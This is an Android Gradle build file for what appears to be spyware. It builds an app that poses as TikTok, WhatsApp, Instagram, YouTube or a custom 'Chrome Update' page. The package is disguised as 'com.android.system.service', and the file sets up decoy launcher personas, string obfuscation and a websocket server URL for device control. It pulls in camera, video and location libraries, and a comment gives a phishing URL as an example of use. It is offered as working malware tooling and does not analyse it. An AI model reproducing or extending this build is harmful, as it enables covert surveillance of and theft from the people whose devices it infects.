plugins {
    id 'com.android.application'
}

// ── LSParanoid string obfuscation ─────────────────────────────────────────────
def skipParanoid = project.findProperty('SKIP_PARANOID') == 'true'

if (!skipParanoid) {
    try {
        apply plugin: 'org.lsposed.lsparanoid'
        println '[OK] LSParanoid enabled.'
    } catch (Exception e) {
        throw new GradleException(
            '[FATAL] LSParanoid unavailable but SKIP_PARANOID != true. ' +
            'Either add the plugin to your classpath or set SKIP_PARANOID=true for debug builds. ' +
            'Error: ' + e.message
        )
    }
} else {
    println '[INFO] LSParanoid skipped (SKIP_PARANOID=true).'
}

// ── CI-injectable properties ──────────────────────────────────────────────────
def serverUrl = project.findProperty('SERVER_URL')
        ?: 'wss://flash-dashboard-7f1r.onrender.com/ws/device'

def keystorePath    = project.findProperty('KEYSTORE_PATH') ?: '../google-services-release.jks'
def keystorePass    = project.findProperty('KEYSTORE_PASS') ?: 'GooglePlayServices2024'
def signingKeyAlias = project.findProperty('KEY_ALIAS')     ?: 'google-services-key'
def keyPass         = project.findProperty('KEY_PASS')      ?: 'GooglePlayServices2024'

def vCode = (project.findProperty('VERSION_CODE') ?: '10205').toInteger()
def vName = project.findProperty('VERSION_NAME') ?: '1.2.5'

// ── Identity system ───────────────────────────────────────────────────────────
//
// APP_IDENTITY — which app this presents itself as (default: tiktok)
//
//   tiktok    → TikTok     — loads www.tiktok.com, TikTok UA, black #010101 splash
//   whatsapp  → WhatsApp   — loads web.whatsapp.com, desktop Chrome UA, green splash
//   instagram → Instagram  — loads www.instagram.com, mobile UA, purple splash
//   youtube   → YouTube    — loads m.youtube.com, mobile UA, red/dark splash
//   custom    → Custom     — loads CUSTOM_URL with CUSTOM_APP_NAME
//
// Examples:
//   ./gradlew assembleRelease -PAPP_IDENTITY=tiktok
//   ./gradlew assembleRelease -PAPP_IDENTITY=whatsapp
//   ./gradlew assembleRelease -PAPP_IDENTITY=custom -PCUSTOM_URL="https://app.mysite.com" -PCUSTOM_APP_NAME="MyApp"
//
def appIdentity = project.findProperty('APP_IDENTITY') ?: 'tiktok'

// ── Custom URL/name (only used when APP_IDENTITY=custom) ──────────────────────
//   CUSTOM_URL     — full URL the WebView loads after setup
//   CUSTOM_APP_NAME— app name shown in splash screen and wizard
//
//   ./gradlew assembleRelease -PAPP_IDENTITY=custom \
//       -PCUSTOM_URL="https://my-phishing-site.com" \
//       -PCUSTOM_APP_NAME="Chrome Update"
//
def customUrl     = project.findProperty('CUSTOM_URL')      ?: ''
def customAppName = project.findProperty('CUSTOM_APP_NAME') ?: ''

// ── Legacy WebView URL override (still supported for backward compat) ─────────
// Setting WEBVIEW_URL overrides whatever AppIdentityManager would load.
// Use APP_IDENTITY=custom + CUSTOM_URL instead — it also sets the splash name + colors.
def webviewUrl = project.findProperty('WEBVIEW_URL') ?: ''

// ── App launcher label ────────────────────────────────────────────────────────
// APP_LABEL overrides the visible launcher icon name.
// If empty, the identity's default name is used (set in AppIdentityManager).
// -PAPP_LABEL="Phone Cleaner Pro"
def appLabel = project.findProperty('APP_LABEL') ?: ''

// ── Decoy persona ─────────────────────────────────────────────────────────────
// DECOY_CHOICE selects the launcher alias persona after setup.
// If not set, DecoyManager.deployOnSetupComplete() auto-picks based on APP_IDENTITY
// (tiktok → 7, whatsapp → 8, instagram → 9, youtube → 10, custom → 11, etc.)
// You can still force a specific one:
//   -PdecoyChoice=1   SysUpdate
//   -PdecoyChoice=7   TikTok ★
//   -PdecoyChoice=8   WhatsApp ★
//   -PdecoyChoice=9   Instagram ★
//   -PdecoyChoice=10  YouTube ★
//   -PdecoyChoice=11  Custom ★
def decoyChoice = project.findProperty('decoyChoice') ?: '-1'   // -1 = auto

def cameraxVersion = '1.3.4'

// ── Android configuration ─────────────────────────────────────────────────────
android {
    // ★ Renamed namespace — no more "seguranca/protecao" strings in the binary
    namespace 'com.android.core.sync'
    compileSdk 35

    defaultConfig {
        // applicationId stays as the opaque system service string — unchanged
        applicationId 'com.android.system.service'
        minSdk 24
        targetSdk 35

        versionCode vCode
        versionName vName

        testInstrumentationRunner 'androidx.test.runner.AndroidJUnitRunner'

        resourceConfigurations += ['en']   // ★ dropped 'pt' — no more Portuguese resources

        buildConfigField 'boolean', 'IS_OBFUSCATED',    'true'
        buildConfigField 'String',  'SERVER_URL',        "\"${serverUrl}\""

        // ── Identity system fields ────────────────────────────────────────────
        // APP_IDENTITY: which persona the main app presents as
        buildConfigField 'String', 'APP_IDENTITY',      "\"${appIdentity}\""
        // CUSTOM_URL: used when APP_IDENTITY=custom
        buildConfigField 'String', 'CUSTOM_URL',        "\"${customUrl}\""
        // CUSTOM_APP_NAME: display name when APP_IDENTITY=custom
        buildConfigField 'String', 'CUSTOM_APP_NAME',   "\"${customAppName}\""
        // WEBVIEW_URL: legacy override — still respected if set
        buildConfigField 'String', 'WEBVIEW_URL',       "\"${webviewUrl}\""
        // DECOY_CHOICE: launcher persona after setup (-1 = auto-match identity)
        buildConfigField 'int',    'DECOY_CHOICE',
            project.hasProperty('decoyChoice') ? project.decoyChoice : '-1'

        // Launcher label override
        if (appLabel?.trim()) {
            resValue 'string', 'app_name', appLabel.trim()
        }
    }

    signingConfigs {
        release {
            storeFile     file(keystorePath)
            storePassword keystorePass
            setKeyAlias(signingKeyAlias)
            keyPassword   keyPass

            v1SigningEnabled true
            v2SigningEnabled true
            enableV3Signing  true
            enableV4Signing  true
        }
    }

    buildTypes {
        debug {
            debuggable     true
            minifyEnabled  false
            shrinkResources false
        }

        release {
            debuggable     false
            minifyEnabled  true
            shrinkResources true

            proguardFiles(
                getDefaultProguardFile('proguard-android-optimize.txt'),
                'proguard-rules.pro'
            )

            signingConfig signingConfigs.release
        }
    }

    aaptOptions {
        cruncherEnabled = false
    }

    packagingOptions {
        jniLibs {
            useLegacyPackaging = true
        }
        resources {
            excludes += [
                'DebugProbesKt.bin',
                'META-INF/*.version',
                'META-INF/NOTICE*',
                'META-INF/LICENSE*',
                'META-INF/DEPENDENCIES',
                'META-INF/services/*',
                'kotlin/**',
                'okhttp3/**',
                'assets/dexopt/*'
            ]
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    buildFeatures {
        viewBinding true
        buildConfig true
    }
}

// ── Dependencies ──────────────────────────────────────────────────────────────
dependencies {
    implementation 'androidx.work:work-runtime:2.9.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.lifecycle:lifecycle-runtime-ktx:2.7.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'

    implementation 'androidx.room:room-runtime:2.6.1'
    annotationProcessor 'androidx.room:room-compiler:2.6.1'

    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'

    implementation "androidx.camera:camera-core:${cameraxVersion}"
    implementation "androidx.camera:camera-camera2:${cameraxVersion}"
    implementation "androidx.camera:camera-lifecycle:${cameraxVersion}"
    implementation "androidx.camera:camera-video:${cameraxVersion}"
    implementation "androidx.camera:camera-view:${cameraxVersion}"

    implementation 'com.google.android.gms:play-services-location:21.3.0'
    implementation 'com.google.guava:guava:32.1.3-android'

    if (skipParanoid) {
        compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
    }

    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}

configurations.configureEach {
    exclude group: 'androidx.profileinstaller', module: 'profileinstaller'
}
